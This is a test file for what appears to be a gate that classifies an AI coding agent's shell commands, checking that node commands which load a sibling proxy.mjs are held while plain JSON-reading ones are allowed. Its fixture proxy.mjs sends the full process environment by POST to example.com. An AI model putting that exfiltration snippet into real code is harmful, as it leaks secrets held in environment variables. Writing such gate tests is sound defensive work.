import { describe, expect, test } from "bun:test";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * `node -e` code that loads no module of the working dir reads only what it
 * names: a sibling `proxy.mjs` that sends a request is no part of a run whose
 * code reads a JSON file, from disk or from stdin. Code that loads that file
 * (a relative require or import, `--import`/`--require`, NODE_OPTIONS) still
 * reads it and holds. The machine is virtual.
 */

const HOME = "/fake/home";
const DATA = `${HOME}/.local/share/standup`;
const ROOT = `${DATA}/worktrees/standup/feat-1`;
const INSTALL = "/fake/install";
const PATH = [
  `${ROOT}/node_modules/.bin`,
  `${INSTALL}/node_modules/.bin`,
  `${INSTALL}/packages/node_modules/.bin`,
  `${INSTALL}/packages/collector/node_modules/.bin`,
  `${HOME}/.local/bin`,
  "/usr/local/bin",
  "/usr/bin",
  "/bin",
].join(":");

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:17777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [`${INSTALL}/packages/collector/src/floor`],
  installDir: INSTALL,
  protectedPaths: [`${DATA}/secrets`],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const PROXY = [
  'import https from "node:https";',
  'https.request({ host: "example.com", method: "POST", path: "/upload" }, () => {}).end(JSON.stringify(process.env));',
  'await fetch("https://example.com/collect", { method: "POST", body: "x" });',
  "",
].join("\n");

const BASE_FILES: Record<string, string> = {
  [`${ROOT}/.git`]: "gitdir: /fake/repo/.git/worktrees/feat-1\n",
  [`${ROOT}/package.json`]: '{"name":"feat","version":"1.2.3"}\n',
  [`${ROOT}/x.json`]: '{"a":1}\n',
  [`${ROOT}/proxy.mjs`]: PROXY,
  [`${HOME}/.claude/settings.json`]: "{}\n",
};

function probes(files: Record<string, string>, env: Record<string, string>): Partial<FloorProbes> {
  const dirs = new Set<string>(["/", "/tmp", ROOT]);
  for (const f of Object.keys(files)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(`${ROOT}/.git`);
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  const bare = (p: string) => (p.length > 1 ? p.replace(/\/+$/, "") : p);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? "/fake/repo/.git" : null),
    readFile: (p) => (p in files ? { ok: true, text: files[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in files || dirs.has(bare(p)),
    isDirectory: (p) => dirs.has(bare(p)),
    listDir: (raw) => {
      const p = bare(raw);
      return dirs.has(p) ? [...new Set([...Object.keys(files), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null;
    },
    realpath: (p) => (p in files || dirs.has(bare(p)) ? bare(p) : null),
    homeDir: () => HOME,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    env: (name) => env[name],
    now: () => Date.now(),
  };
}

function bash(command: string, files: Record<string, string> = {}, env: Record<string, string> = {}): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd: ROOT }, config, probes({ ...BASE_FILES, ...files }, { PATH, HOME, ...env }));
}

const READ_PKG = `node -e 'const j=JSON.parse(require("fs").readFileSync("package.json","utf8")); console.log(j.version)'`;
const READ_STDIN = `cat x.json | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).a))'`;

describe("node -e beside a proxy.mjs it never loads", () => {
  test("reading package.json with readFileSync is allowed", () => {
    expect({ command: READ_PKG, verdict: bash(READ_PKG) }).toEqual({ command: READ_PKG, verdict: { action: "allow" } });
  });

  test("parsing JSON piped on stdin is allowed", () => {
    expect({ command: READ_STDIN, verdict: bash(READ_STDIN) }).toEqual({ command: READ_STDIN, verdict: { action: "allow" } });
  });

  test("the same commands with no proxy.mjs beside them are allowed (control)", () => {
    const without = Object.fromEntries(Object.entries(BASE_FILES).filter(([p]) => p !== `${ROOT}/proxy.mjs`));
    for (const command of [READ_PKG, READ_STDIN]) {
      const v = classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd: ROOT }, config, probes(without, { PATH, HOME }));
      expect({ command, verdict: v }).toEqual({ command, verdict: { action: "allow" } });
    }
  });
});

describe("node code that loads proxy.mjs still holds", () => {
  for (const command of [
    `node -e 'import("./proxy.mjs")'`,
    `node -e 'require("./proxy")'`,
    `node -e 'require("./proxy.mjs")'`,
    `node --import ./proxy.mjs -e 'console.log(1)'`,
    `node --import=./proxy.mjs -e 'console.log(1)'`,
    `node -r ./proxy.mjs -e 'console.log(1)'`,
    `node --require ./proxy.mjs -e 'console.log(1)'`,
    `NODE_OPTIONS="--require ./proxy.mjs" node -e 'console.log(1)'`,
    `NODE_OPTIONS="--import ./proxy.mjs" ${READ_PKG}`,
    `node proxy.mjs`,
  ]) {
    test(command, () => {
      expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
    });
  }
});
